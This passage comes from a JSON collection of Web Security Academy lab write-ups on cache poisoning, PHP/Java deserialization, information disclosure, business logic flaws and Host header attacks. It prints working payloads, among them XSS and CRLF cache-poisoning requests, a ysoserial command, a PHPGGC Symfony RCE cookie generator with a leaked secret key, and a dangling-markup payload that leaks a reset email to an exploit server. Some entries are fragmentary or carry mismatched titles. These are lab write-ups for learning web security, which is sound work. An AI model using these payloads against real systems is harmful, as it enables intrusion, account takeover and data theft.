"content": "The home page uses the X-Forwarded-Host header to fetch a JSON file (geolocate.json). That JSON is then used by a JavaScript function that is vulnerable to DOM XSS.The cache normally does not store responses that contain a Set-Cookie header, but we can bypass that by using a request where the session cookie is already set. I \ufb01rst found that the X-Forwarded-Host header controls where the site loads its geolocate.json \ufb01le. I created a malicious version of that \ufb01le on my exploit server, replacing the country \ufb01eld with <img src=1 onerror=alert(document.cookie) />. I added the Access-Control-Allow-Origin: * header so the browser would accept it. I then loaded the home page to get a request with an existing session cookie (so no Set-Cookie header was returned). I sent that request to Repeater, added X-Forwarded-Host: my-exploit-server.net, and replayed it until the response showed X-Cache: hit. The cache stored the page with my malicious JSON. When the victim visited the home page, the script loaded my payload and the alert \ufb01red, solving the lab."}, {"num": "16.11", "difficulty": "EXPERT", "title": "Combined cache poisoning techniques", "content": "This combines two cache\u2011poisoning tricks to make a victim run malicious JavaScript. The site loads translation \ufb01les based on a language cookie. Normally, English users are safe, but Spanish users are vulnerable to XSS via those translation \ufb01les. I need to: 1) make the site load my malicious Spanish translation \ufb01le, and 2) force English users to switch to Spanish, so they hit the poisoned page and trigger the XSS. Step 1 is to Find the attack surface. I used Param Miner to \ufb01nd two supported headers: X-Forwarded-Host and X-Original-URL. 1. X-Forwarded-Host lets me change where the site loads its translation JSON \ufb01le."}, {"num": "16.12", "difficulty": "EXPERT", "title": "Cache key injection", "content": "This lab has several small bugs that work together. One bug lets us add extra stuff to the cache key. Another lets us inject code into a JavaScript \ufb01le. Another lets us control a redirect. By chaining them, we can make the victim\u2019s browser run alert(1) when they visit the home page. I \ufb01rst looked at the /login page. The server removes the utm_content parameter from the cache key, so I could add it to the URL without changing the cache. That meant I could sneak in extra data. Then I found that the page /login/ loads a script /js/localize.js and passes the lang parameter directly into the script\u2019s URL without encoding. That\u2019s client\u2011side parameter pollution I could add extra parameters to that script request.Send to repeater this 302 found /login?lang. Next, I noticed that the script /js/localize.js reads the Origin header. If I set the cors=1 parameter, the server re\ufb02ects that Origin header into the response. I could inject newlines into the header, which let me add extra HTTP headers - a response header injection. Change the GET /login header into inserting this scripts : GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2 Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$ GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%2 08%250d%250a%250d%250aalert(1)$$%23 HTTP/2 Let\u2019s \ufb01rst try the \ufb01rst GET request which is /js: Second attempt using the second script GET request: In short we poisoned two requests: One to /js/localize.js with a crafted lang parameter that passed through utm_content (unkeyed) and cors=1, and an Origin header that injected Content-Length: 8 and a newline, then alert(1). Another to /login?lang=en?utm_content=... that used the same injection to redirect the victim to the poisoned script. Because the cache ignored my extra parameters, the poisoned script got stored in the cache. When the victim visited the home page (which triggered the login redirect), they loaded the malicious script and alert(1) \ufb01red. This lab shows how multiple small issues can be combined: a cache key exclusion, a client\u2011side parameter pollution, a response header injection, and a cache key injection. Each bug alone might not be dangerous, but together they create a full exploit."}, {"num": "16.13", "difficulty": "EXPERT", "title": "Internal cache poisoning", "content": "This uses two layers of caching: an external cache (closer to the user) and an internal cache (behind the scenes). The external cache includes the query string in the cache key, but the internal cache does not. By using the X-Forwarded-Host header, we can trick the internal cache into storing a malicious version of a JavaScript \ufb01le. When the victim visits the home page, they load that poisoned \ufb01le and run alert(document.cookie). I started by loading the home page and sending it to Burp Repeater. I noticed that changing the query string always changed the response , the external cache includes it in the key so we will be using a Param miner to add dynamic cache-buster parameter. That let me bypass the external cache and see the real response. Sending it also to the repeater. I then added the X-Forwarded-Host header with my exploit server\u2019s URL. Most of the time, only two of the three dynamic URLs in the response changed to my server the third (geolocate.js) stayed the same. But if I kept sending the request, eventually that third URL also pointed to my exploit server. This showed that the geolocate.js URL was being cached separately by the internal cache, and the internal cache ignored both the query string and the X-Forwarded-Host header. I removed the header and saw that the internally cached fragment still held my exploit server URL - proving the header was unkeyed for the internal cache. I then went to the exploit server and created the \ufb01le /js/geolocate.js with the payload alert(document.cookie). I send that request multiple times so that the response would show 4 matches. I kept replaying the request to keep the cache poisoned. When the victim visited the home page, they loaded the poisoned geolocate.js and the alert \ufb01red, solving the lab. Multiple cache layers can have different rules. Here, the external cache included the query string in its key, but the internal cache did not. That allowed me to poison the internal cache with a malicious \ufb01le while the external cache still served fresh content."}]}, {"num": "17", "title": "Insecure Deserialization", "labs": [{"num": "17.2", "difficulty": "PRACTITIONER", "title": "Data type modi\ufb01cation", "content": "The application uses PHP serialized objects in the session cookie to store user data. By manipulating the serialized string, we can change the username and alter the data type of the access token to bypass authentication and gain administrator privileges. I logged in as wiener and captured the GET /my-account request. Using Burp\u2019s Inspector, I examined the session cookie, which contained a serialized PHP object. I modi\ufb01ed the object: changed the username from wiener to administrator and updated its length to 13. I also changed the access_token from a string to an integer (0) by altering the data type label from s to i and removing the quotes. The resulting object was : O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}. After applying the changes, the server treated me as an administrator, and the response included a link to /admin. I then accessed /admin/delete?username=carlos to delete the user, solving the lab."}, {"num": "17.3", "difficulty": "PRACTITIONER", "title": "Exploiting application functionality", "content": "The application uses PHP serialized objects in the session cookie to store user data, including the avatar \ufb01le path. The account deletion feature reads this path and deletes the \ufb01le. By modifying the serialized object to point to Carlos\u2019s morale.txt, we can make the deletion feature delete that \ufb01le instead. I logged in as wiener and captured a request containing my session cookie. I sent it to Repeater and examined the cookie using Burp\u2019s Inspector. The serialized object included an avatar_link attribute with the path to my avatar. I changed that path to /home/carlos/morale.txt and updated the length indicator accordingly. I got 3 access tokens and : duemt62ntdh0em7djiezmqeq86j917y1 for user gregg) isy6624zejyufvqhaphq9uhjhvcf7xs6 (for carlos) pbheo2t1rudnamtwq7t2z3t3wiahz593 (for wiener) Just change the access token and submit using repeater."}, {"num": "17.4", "difficulty": "PRACTITIONER", "title": "PHP object injection", "content": "Login using the own credentials and we will see this php \ufb01le look like serilizing & unserilize code. Send it to the repeater and add \u201c~\u201d in the last strings, So we can able to read the response."}, {"num": "17.5", "difficulty": "PRACTITIONER", "title": "Java deserialization via Apache Commons", "content": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoi L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9 tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ"}, {"num": "17.6", "difficulty": "PRACTITIONER", "title": "PHP gadget chain exploitation", "content": "java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\ --add-opens=java.base/java.net=ALL-UNNAMED \\ --add-opens=java.base/java.util=ALL-UNNAMED \\ -jar ysoserial-all.jar \\ CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0"}, {"num": "17.7", "difficulty": "PRACTITIONER", "title": "Exploiting PHP deserialization with a pre-built gadget chain", "content": "I began by logging into the lab and examining my session cookie, which was a Base64\u2011encoded token signed with an HMAC\u2011SHA1 hash. Decoding it revealed a serialized PHP object. Modifying the cookie triggered an error that disclosed the framework (Symfony 4.3.6) and a debug \ufb01le at /cgi-bin/phpinfo.php. Accessing that page leaked the SECRET_KEY used for signing. Using PHPGGC, I generated a gadget chain for Symfony/RCE7 with the command rm /home/carlos/morale.txt and Base64\u2011encoded it. Using phpggc, Generate a base64-encoded gadget chain using compatible Symfony RCE chain Then generate this make_cookie php : <?php $payload = \"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW 1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2 hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6NjE6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFR hZ0F3YXJlQWRhcHRlcgBnZXRUYWdzQnlLZXkiO3M6Njoic3lzdGVtIjt9Cg==\"; $secretKey = \"iorg24nu9pfjyjrjk10nmmz47zo9od1r\"; $hmac = hash_hmac('sha1', $payload, $secretKey); $cookie = urlencode('{\"token\":\"'. $payload .'\",\"sig_hmac_sha1\":\"'. $hmac .'\"}'); echo $cookie; ?> Combining it with the secret key leaked from phpinfo.php. First, it stores the malicious base64 payload in the $payload variable and the secret key in $secretKey. It then computes an HMAC\u2011SHA1 signature of the base64 payload using hash_hmac(), which is critical because the server expects the signature to be calculated on the exact token string it receives. Next, it constructs a JSON object with two \ufb01elds: token containing the base64 payload, and sig_hmac_sha1 containing the computed signature matching the original cookie structure. Finally, it URL\u2011encodes the entire JSON string using urlencode() so it can be safely placed in an HTTP cookie header, and outputs the result. Replacing my session cookie with this malicious value in a GET /my-account request caused the server to deserialize the object and execute the command."}, {"num": "17.8", "difficulty": "PRACTITIONER", "title": "Exploiting Ruby deserialization using a documented gadget chain", "content": "17.9 EXPERT - Custom Java gadget chain development Go to target sitemap so we can see this access token user java, send it to the repeater. Observe this 2 different response when i remove the Access Token : Then i remove some of the headers : The contents of Product Template : The error that appears is the password of the administrator : 05u6udj0l1ueubh989m1"}, {"num": "17.10", "difficulty": "EXPERT", "title": "Custom PHP gadget chain development", "content": "This lab uses PHP object serialization to store session data. When the server unserializes this data, it runs special \u201cmagic\u201d methods that can be tricked into running system commands. By building a custom chain of objects, we can make the server delete a \ufb01le. The goal is to remove morale.txt from Carlos\u2019s home folder. I logged in with the given credentials and noticed the session cookie contained a serialized PHP object. I found that the website referenced a \ufb01le /cgi-bin/libs/CustomTemplate.php. I retrieved its source code by requesting the backup \ufb01le CustomTemplate.php~ (the server returned the code). Inside this code i found two interesting classes which is CustomTemplate has a __wakeup() method that creates a new Product object using two properties: default_desc_type and desc and DefaultMap has a __get() method that runs when you try to read a property that doesn\u2019t exist. This method calls call_user_func() with two things: a callback (stored in the object\u2019s callback property) and the name of the missing property. If I could make the Product constructor look for a missing property on a DefaultMap object, and set that missing property name to my command, the __get() would execute exec(\"my command\"). So i built a serialized object An outer CustomTemplate with default_desc_type set to \"rm /home/carlos/morale.txt\" (the command) and desc set to a DefaultMap object and The DefaultMap has its callback property set to \"exec\". When the server unserializes this, the __wakeup() of CustomTemplate creates a Product that tries to read default_desc_type from the desc object (the DefaultMap). Since DefaultMap doesn\u2019t have that property, its __get() runs, calling exec with the command string. The \ufb01le gets deleted. I serialized the object, Base64\u2011encoded it (because the session cookie expects that), and URL\u2011encoded it to use in the cookie. I replaced my session cookie with this value, reloaded the page, and the lab was solved. PHP deserialization is dangerous when combined with \u201cmagic methods\u201d that can be triggered automatically. Attackers can chain existing classes together to perform unintended actions."}, {"num": "17.11", "difficulty": "EXPERT", "title": "PHAR deserialization exploitation", "content": "This lab doesn\u2019t use normal PHP deserialization, but it does use a PHAR \ufb01le (a PHP archive) that can trigger deserialization when read with a phar:// stream. Combined with a gadget chain we found in the source code, we can run server\u2011side template injection (SSTI) to execute a system command. The goal is to delete morale.txt from Carlos\u2019s home directory. I opened the site map and found the request for `/cgi-bin/avatar.php`. I sent it to Repeater, then changed the path to just `/cgi-bin` to see what \ufb01les were available in that directory. In the code, I found a gadget chain: Blog object has a desc attribute, CustomTemplate object has a lockFilePath attribute that is passed to \ufb01le_exists(). And \ufb01le_exists() triggers the __toString() magic method of the Blog object when the Blog is used as a string. This is the image that we will be uploading on the website : (source : github) This is a PHAR \ufb01le (a PHP archive) that also looks like a valid JPG (a polyglot). I uploaded this as my avatar. I changed the request to load the avatar using a phar:// stream: GET /cgi-bin/avatar.php?avatar=phar://wiener. This forced PHP to parse the uploaded \ufb01le as a PHAR, which triggered deserialization of my crafted objects. The gadget chain executed, the SSTI payload ran, and rm /home/carlos/morale.txt was executed, deleting the \ufb01le and solving the lab. PHAR \ufb01les can be used to trigger deserialization even when the application doesn\u2019t explicitly unserialize user input. Any function that accesses a \ufb01le with phar:// (like \ufb01le_exists(), \ufb01le_get_contents()) can lead to deserialization if the \ufb01le contains a serialized object."}]}, {"num": "18", "title": "Information Disclosure", "labs": [{"num": "18.2", "difficulty": "APPRENTICE", "title": "Debug page exposure", "content": "At \ufb01rst, I had di\ufb03culty getting the URL to the Site map. The thing is that the \"INTERCEPT BUTTON\" must be off, and yeah, now it works. Right-click the URL -> Engagement tools -> Find comment. In the Find comment tab, we will see this a href: The HTML comment reveals a hidden debug link pointing to /cgi-bin/phpinfo.php. This is our target. Go back to Burp on the Site Map tab, click the folder URL, then locate /cgi-bin/phpinfo.php -> right-click -> Send to Repeater. In Repeater, send the GET request to view the phpinfo page. This page exposes extensive debugging information, including environment variables. Scroll through or search for \"SECRET_KEY\" to \ufb01nd the value we need. HTML comments can leak hidden endpoints, and debug pages like phpinfo.php expose sensitive data. Always remove both before deployment."}, {"num": "18.3", "difficulty": "APPRENTICE", "title": "Backup \ufb01le source disclosure", "content": "18.4 APPRENTICE - Authentication bypass via information leakage"}, {"num": "18.5", "difficulty": "PRACTITIONER", "title": "Version control history disclosure", "content": "I started by noticing that the website had an exposed .git folder, which meant its entire version control history was publicly accessible. This is a serious security miscon\ufb01guration because it allows anyone to download the repository and dig through past commits. I went to my terminal and used wget -r followed by the lab URL with /.git/ at the end to recursively download the entire hidden directory. When I \ufb01rst ran ls, I saw nothing, so I used ls -la to reveal the hidden .git folder and then moved into it with cd .git. Once inside, I needed to reconstruct the actual repository from the downloaded \ufb01les, so I used a tool called git-dumper to rebuild everything properly. With the full repository now available locally, I started exploring its history. The current version of admin.conf only showed a placeholder value ADMIN_PASSWORD=env('ADMIN_PASSWORD'), which told me the real password had been removed in a later commit. To uncover the original secret, I ran git re\ufb02og, which acts like Git's local diary and shows every movement of HEAD including past commits that are no longer visible. This revealed an earlier commit where the password was still present. I also ran git fsck --lost-found as an extra measure to check for any dangling commits that might have been completely orphaned. Finally, I used git show with the old commit hash followed by :admin.conf to view the exact contents of that \ufb01le from before the password was removed. The vulnerability here is exposing the .git folder on a live website, which gives attackers access to your entire commit history. Even if you remove sensitive information in a later commit, the old version still exists in Git's history and can be recovered using simple commands like git re\ufb02og and git show. To prevent this, you must block public access to /.git/ in your web server con\ufb01guration and never deploy the .git folder to production and lastly, the passwords or secrets must not be commit."}]}, {"num": "19", "title": "Business Logic Vulnerabilities", "labs": [{"num": "19.2", "difficulty": "APPRENTICE", "title": "High-level logic \ufb02aw", "content": "The objective of this lab is to purchase the \"Lightweight l33t leather jacket\" despite having insu\ufb03cient store credit. Standard login credentials are provided: wiener:peter. The vulnerability lies in how the server handles item quantities. After logging in, add a cheap item to the cart and examine the HTTP history in Burp Suite. The POST /cart request contains a quantity parameter that determines how many items are added. When the request is intercepted, modify the quantity parameter to a negative number, such as -10, then forward the request. Checking the cart will con\ufb01rm that the quantity was successfully updated and the total price has decreased or become negative. After that, Add the expensive leather jacket to the cart normally. Then adjust the negative quantity of the cheap item until the total price falls below the available store credit. Placing the order at this point solves the lab. The vulnerability \ufb02aw here is that the server validates the presence of a quantity parameter but fails to check whether the value is positive. Any number, including negatives, is accepted. This allows manipulation of the total price."}, {"num": "19.3", "difficulty": "APPRENTICE", "title": "Inconsistent security controls", "content": "Open the lab and use Burp Suite's content discovery tool (Target > Site map > right-click > Engagement tools > Discover content). Start the scan and wait. The tool will \ufb01nd a hidden path: /admin. Browsing to this path shows an access denied message, but the error reveals that only DontWannaCry users can enter. Go to the account registration page. A message indicates that employees must use their company email. Register using any email address, but use the lab's provided email domain (found by clicking \"Email client\"). Check the email client, click the con\ufb01rmation link, and complete registration. Log in with the new account. Visit the \"My account\" page and notice the option to change email. Change it to any address ending in @dontwannacry.com (like fake@dontwannacry.com). The system accepts the change without veri\ufb01cation.Now visit /admin again. Access is granted. Find and delete carlos to solve the lab. Inconsistent security controls occur when an application applies different rules to the same data. In this lab, the registration process allowed any email address, but administrative access required an email ending with @dontwannacry.com. By changing the email after logging in, the restriction was bypassed."}, {"num": "19.4", "difficulty": "APPRENTICE", "title": "Flawed business rule enforcement", "content": "This lab involves purchasing the \"Lightweight l33t leather jacket\" without su\ufb03cient store credit using the provided credentials wiener:peter. The vulnerability exists in how the application handles discount coupon codes, allowing them to be reused through a simple alternating pattern. After logging in, locate the existing coupon code NEWCUST5 available on the site. Sign up for the newsletter at the bottom of the page to receive a second coupon code SIGNUP30. Add the leather jacket to the shopping cart and proceed to checkout. Apply both coupon codes to receive an initial discount on the total price. Attempt to apply the same code twice in a row and observe that it is rejected with a message indicating the coupon has already been used. However, trying the codes in an alternating sequence, such as NEWCUST5, then SIGNUP30, then NEWCUST5 again, reveals that the system accepts them repeatedly. Continue alternating between the two codes until the total price drops below the available store credit, then complete the order to solve the lab."}, {"num": "19.5", "difficulty": "PRACTITIONER", "title": "Low-level logic \ufb02aw", "content": "This lab demonstrates an integer over\ufb02ow vulnerability in the purchasing work\ufb02ow. The application fails to properly validate the quantity of items a user can add to their cart, allowing an attacker to manipulate the total price by exploiting how the backend handles large numbers. The goal is to buy an expensive leather jacket despite having insu\ufb03cient store credit. To exploit this, I \ufb01rst logged in and attempted to purchase the jacket normally, but the order was rejected due to lack of funds. While studying the tra\ufb03c in Burp Suite, I noticed that each request to add items to the cart only accepts a two-digit quantity cause it\u2019s not accepting 100. I sent this request to Intruder and set the quantity to 99, then launched an attack with null payloads set to continue inde\ufb01nitely. (Follow this steps before starting the attack: ) Null Payload\u2019s then Continue in\ufb01nitely As the attack ran, I monitored my cart and eventually saw the total price suddenly become a large negative number. This happened because the cumulative price exceeded the maximum value for a 32-bit signed integer. After clearing my cart, I calculated the number of jackets needed to land the total within my available credit after the over\ufb02ow. The jacket price is stored in cents ($1337.00). I ran another Intruder attack, this time generating exactly 323 payloads with concurrent requests set to one to ensure accuracy. Once complete, I sent a single request adding 47 more jackets, which brought the total to -$1,221.96. I then added a small quantity of another item to adjust the total to fall between $0 and my remaining $100 credit, allowing me to successfully checkout and solve the lab. The vulnerability exists because the developer assumed users would only add reasonable quantities and did not anticipate integer over\ufb02ow. The backend language used a \ufb01xed-size integer to calculate totals without checking for over\ufb02ow."}, {"num": "19.6", "difficulty": "PRACTITIONER", "title": "Exceptional input handling \ufb02aw", "content": "This lab contains a logic \ufb02aw in its account registration process that allows me to gain administrative access. I began by using Burp's content discovery tool on the Target site map, which revealed an /admin path. However, when I tried to access it, an error message indicated that only \"DontWannaCry\" users could view the admin panel. The registration page hinted that DontWannaCry employees must use their company email address, so I needed to \ufb01nd a way to register with a @dontwannacry.com email despite not having one. I \ufb01rst tested how the application handles exceptionally long inputs. Using the email client provided in the lab (with a unique domain like @YOUR-EMAIL-ID.web-security-academy.net), I registered an account with an email address containing over 200 characters. -very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-s tringvery-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-lon g-string I then crafted a second registration attempt to exploit this truncation. This time, I inserted dontwannacry.com as a subdomain within my email address, like this: very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net. I carefully calculated the length of the local part so that the \ufb01nal character of @dontwannacry.com fell exactly at position 255. When I registered, the con\ufb01rmation email was still sent to my actual email client because the full address was used for delivery. However, when the server stored the address in its database, it truncated everything after the 255th character which meant the stored email now ended with @dontwannacry.com. From the application's perspective, I had successfully registered with an o\ufb03cial DontWannaCry email address. After con\ufb01rming this new account via email, I logged in and found that I now had access to the admin panel. From there, I deleted the user carlos to solve the lab. The vulnerability here is that the application truncates/cuts off long emails af 255 characters but still the email sends the full address. This lets me sneak a trusted domain name right at the cutoff point, tricking the app into thinking I'm a legitimate user."}, {"num": "19.7", "difficulty": "PRACTITIONER", "title": "Weak endpoint isolation", "content": "This lab contains a logic \ufb02aw in its password change functionality that allows me to take over other users' accounts. After logging into my own account as wiener with the password peter, I accessed the account page and intercepted on then change the password to change request. using Burp. By sending this request to Repeater and experimenting with it, I discovered something interesting: when I removed the current-password parameter entirely, the application still allowed me to change the password without providing my current one. I tested this several times to con\ufb01rm, and each time it worked. The key observation was that the server determines whose password to change based solely on the username parameter in the request. Since the endpoint no longer required my current password for veri\ufb01cation, I simply changed the username parameter from wiener to administrator and sent the request again. This successfully changed the administrator's password to whatever I set. After logging out, I was able to log back in as administrator using the password I just set. From there, I accessed the admin panel and deleted the user carlos to solve the lab. The vulnerability exists because the same endpoint handles both password changes for your own account and for administrative purposes, but fails to properly enforce authorization checks when certain parameters are omitted."}, {"num": "19.8", "difficulty": "PRACTITIONER", "title": "Insu\ufb03cient work\ufb02ow validation", "content": "The goal of this lab is to purchase a \"Lightweight l33t leather jacket\" even though you don't have enough store credit. Purchase any affordable item to study the normal checkout \ufb02ow. In the HTTP history, locate the POST /cart/checkout request and observe that it redirects to a con\ufb01rmation page. Send the GET /cart/order-con\ufb01rmation?order-con\ufb01rmation=true request to Burp Repeater. Add the expensive leather jacket to your cart but do not proceed with checkout. In Burp Repeater, resend the saved con\ufb01rmation request. The order completes successfully and the jacket is purchased without deducting any store credit, solving the lab. The vulnerability here is the insu\ufb03cient work\ufb02ow validation, where the server trust the users intended sequence of steps without actually verifying the step. This allows us to skip the critical actions like payment directly on the application, we just bypassed it by using the burp request."}, {"num": "19.9", "difficulty": "PRACTITIONER", "title": "State machine authentication bypass", "content": "19.10 PRACTITIONER - In\ufb01nite money logic \ufb02aw This lab contains a logic \ufb02aw in the purchase system. You can buy a $10 gift card, apply a 30% discount coupon, pay only $7, and then redeem the gift card for $10 in store credit. This creates a $3 pro\ufb01t each time. By repeating this process many times, you can generate unlimited store credit and \ufb01nally buy an expensive jacket. I logged in and signed up for the newsletter to get the coupon SIGNUP30. I added a $10 gift card to the cart, applied the coupon, and checked out. After paying, I copied the gift card code and redeemed it from my account page. This added $3 to my store credit. To automate the cycle, I set up a session handling macro in Burp that repeated the sequence: add gift card to cart, apply coupon, complete the order, capture the gift card code, and redeem it. Go to settings and \ufb01nd the Session tab, we will be adding A new macro with a scope of include All URLs. Select the following sequence of requests: POST /cart POST /cart/coupon POST /cart/checkout GET /cart/order-con\ufb01rmation?order-con\ufb01rmed=true POST /gift-card Then lets con\ufb01gure item the GET /cart/order with a parameter name gift-card and then i select/highlight on the body the code we got on the Gift card. I n the Macro Editor, click Test macro. Look at the response to GET /cart/order-con\ufb01rmation?order-con\ufb01rmation=true and note the gift card code that was generated. Look at the POST /gift-card request. Make sure that the gift-card parameter matches and con\ufb01rm that it received a 302 response. Keep clicking \"OK\" until you get back to the main Burp window. Going back to the HTTP history send the GET /my-account into the intruder and use a sniper attack with null payloads and 1 resource pool. I ran this macro 412 times using Burp Intruder with null payloads and a single concurrent connection. After the attack, I had enough store credit to buy the Lightweight l33t leather jacket, solving the lab. The \ufb02aw is a classic business logic error where the system allows unlimited pro\ufb01t from a combination of discounts and gift card redemption. To prevent this, applications should enforce limits on coupon usage per user, ensure that gift cards cannot be redeemed for more than their purchase price after discounts, and implement safeguards to detect and block repetitive loops. Monitoring unusual transaction patterns also helps catch such abuse."}, {"num": "19.11", "difficulty": "PRACTITIONER", "title": "Encryption oracle authentication bypass", "content": "Using intercept on, Post a random comment with a invalid email then forward. Change the noti\ufb01cation using the stay-logged-in cookie. The results show that the content of stay-logged-in is username:timestamp. Wiener:1774090955477 i\u2019ll paste this on my repeater using the POST /post/comment and change the username to administrator:timestamp."}, {"num": "19.12", "difficulty": "EXPERT", "title": "Email parsing discrepancy access control bypass", "content": "This lab shows how an attacker can trick a website into accepting a fake email address. The site only allows emails that end with @ginandjuice.shop, but it uses a \ufb02awed way to check emails. By using a special encoding called UTF-7, the attacker can make the site think the email ends with the allowed domain, while the actual email goes to a different server. This lets the attacker register an account and then delete another user. I \ufb01rst tried to register with foo@exploit-server.net, but the site blocked it because the domain wasn't allowed. I tested different email encodings. When I used UTF-7 encoding, the site did not detect it as suspicious. I crafted an email address like =?utf-7?q?attacker&AEA-exploit-0a90007804ac77be849605cc0117002e.exploit-server.net&A CA-?=@ginandjuice.shop The site saw the @ginandjuice.shop at the end and allowed the registration. However, the email server interpreted the encoded part as attacker@[YOUR-EXPLOIT-SERVER]. I received the con\ufb01rmation email, clicked the link, and activated my account. Then I logged in, accessed the admin panel, and deleted the user carlos to solve the lab. The mistake is that the site tried to block suspicious encodings but missed UTF-7. The validation should not rely on the \ufb01nal part of the email only; it should properly decode and verify the entire address. To prevent this, always use a robust email parsing library that normalizes all encodings before checking the domain. This ensures that attackers cannot hide the real email address inside encoded text."}]}, {"num": "20", "title": "HTTP Host Header Attacks", "labs": [{"num": "20.2", "difficulty": "APPRENTICE", "title": "Host header authentication bypass", "content": "I started by sending the GET / request to Burp Repeater and noticed I could change the Host header to any value and still access the page , con\ufb01rming the server doesn't validate it. After checking /robots.txt, I found an admin panel at /admin, but accessing it returned an error revealing that only local users could view it. This hinted that the server might be using the Host header to enforce access controls. I sent the GET /admin request to Repeater, changed the Host header to localhost, and successfully accessed the admin panel. From there, I modi\ufb01ed the request to GET /admin/delete?username=carlos and sent it, deleting Carlos and solving the lab. The Host header is user-controllable and should never be trusted for security decisions like authentication or access control. Always rely on proper server-side validation and session-based checks instead."}, {"num": "20.3", "difficulty": "PRACTITIONER", "title": "Cache poisoning via ambiguous requests", "content": "The lab demonstrates web cache poisoning attack that exploits discrepancies/inconsistencies in how the cache and backend server handle ambiguous requests.The objective is to poison the cache so the homepage executes a alert(document.cookie). Visit the home page and notice that the response includes verbose caching headers (X-Cache). If you modify the Host header, you can no longer access the page. To avoid hitting cached responses during testing, append a unique query parameter (e.g., ?cb=123) to your requests. This lets you fetch fresh responses from the origin. GET /?cb=123 HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Host: arbitrary.com Notice that the page loads successfully (the validation only checks the \ufb01rst header?), and the second Host value is re\ufb02ected in an absolute URL used to import a script from /resources/js/tracking.js. The lab was successful because I added a second Host header to a GET / request, and that caused the page to load a malicious script that triggered an alert."}, {"num": "20.4", "difficulty": "PRACTITIONER", "title": "Routing-based SSRF", "content": "On the \ufb01rst testing, change the header value to a collaborator payload then check the network interactions in the table including the HTTP requests. I send the request GET / to the intruder but i change the host header to a octet. Select add the last number which is 0 and then choose FROM:0 To:255 then start the attack. Then wait for the 302 response because that is our /admin endpoint. Don\u2019t forget to uncheck the Update host to match target cause it\u2019s take me a long time to realize that this was mistake that\u2019s why i cant able to see the 302 response. Send the request to the repeater and change it to GET /admin. If it generated POST /admin/delete with both CSRF ,manually craft a request to delete carlos. Copy the CSRF and paste it to the query parameter to your request /admin/delete?csrf=shdas&username=carlos."}, {"num": "20.5", "difficulty": "PRACTITIONER", "title": "SSRF via \ufb02awed parsing", "content": "This lab demonstrates SSRF caused by \ufb02awed request parsing. The server normally validates the Host header, but if the request line contains an absolute URL, the Host header is ignored and the absolute URL\u2019s host is used instead. This allows an attacker to make the server issue requests to arbitrary internal targets. I then test to manipulate the Host header where i add .com in the ending string and the GET /endpoint i paste my https.lab id , it gives me 504 gateway timeout meaning : The Collaborator received a request, con\ufb01rming the SSRF. Using Intruder, I scanned the 192.168.0.0/24 range by placing each IP in the Host header while keeping the absolute URL \ufb01xed. I found the internal admin panel at 192.168.0.x. Send the successful response to the repeater and add /admin on the very last string. On the next response this time we will \ufb01nd the csrf token and add it to our endpoint, and built a request to /admin/delete?csrf=TOKEN&username=carlos. After converting the method to POST and adding the session cookie, I sent it, deleting carlos and solving the lab. The vulnerability arises from inconsistent host validation between the request line and the Host header. To prevent such SSRF, ensure that all host\u2011derived inputs are validated consistently, and avoid relying solely on the Host header when absolute URLs are permitted. Whitelisting allowed hosts and using proper URL parsing can mitigate this attack."}, {"num": "20.6", "difficulty": "PRACTITIONER", "title": "Host validation bypass via connection state", "content": "This lab shows how a server can be tricked by reusing the same connection. The front\u2011end checks the Host header only for the \ufb01rst request on a connection, then assumes all later requests go to the same host. This lets an attacker sneak in a request to an internal admin panel. I tried to directly access the admin panel at http://192.168.0.1/admin, but the server blocked it. I set up two requests in a single connection. The \ufb01rst request was a normal one to the main website. The second request, sent over the same connection, asked for /admin with the Host header set to the internal IP. Because the server already trusted the connection, it accepted the second request and returned the admin page. I copied the CSRF token from that page, built a POST request to delete carlos, and sent both requests again in sequence. This deleted carlos and solved the lab. The mistake is trusting the Host header after the \ufb01rst request on a connection. Servers must validate every request independently, regardless of connection reuse. The \ufb01x is to check the Host header on each request or disable connection reuse for sensitive endpoints."}, {"num": "20.7", "difficulty": "EXPERT", "title": "Dangling markup password reset poisoning", "content": "This lab shows how an attacker can steal a password reset token using dangling markup. The password reset email is sent with a new password directly in the body. The raw version of the email is not sanitized, so an attacker can inject HTML that leaks the rest of the email content, including the new password, to an external server. (Just testing)Try to modify the Host header to something that is not existing or something arbitrary. I \ufb01rst requested a password reset for my own account and checked the email client. The raw version of the email was unsanitized, while the rendered version was cleaned by DOMPurify. I noticed that when I sent the password reset request, I could add an arbitrary port to the Host header and still get a valid email. That port was re\ufb02ected inside a link in the raw email. I used this to break out of the string and inject a dangling markup payload: Host: lab-id.web-security-academy.net:'<a href=\"//my-exploit-server.net/?. The email that arrived contained my payload, which caused the browser to make a request to my exploit server, including the rest of the email body (the new password) in the URL. Repeat the process, but this time with our target user Carlos. I captured the request in the exploit server\u2019s access log and got my own password. Then I repeated the process with username=carlos, and the log revealed Carlos\u2019s new password. I logged in as Carlos and solved the lab. The vulnerability occurs because the raw version of the email is not sanitized, allowing HTML injection. The injected payload creates a link that, when the victim views the email, causes their browser to send the remaining email content to an attacker\u2011controlled 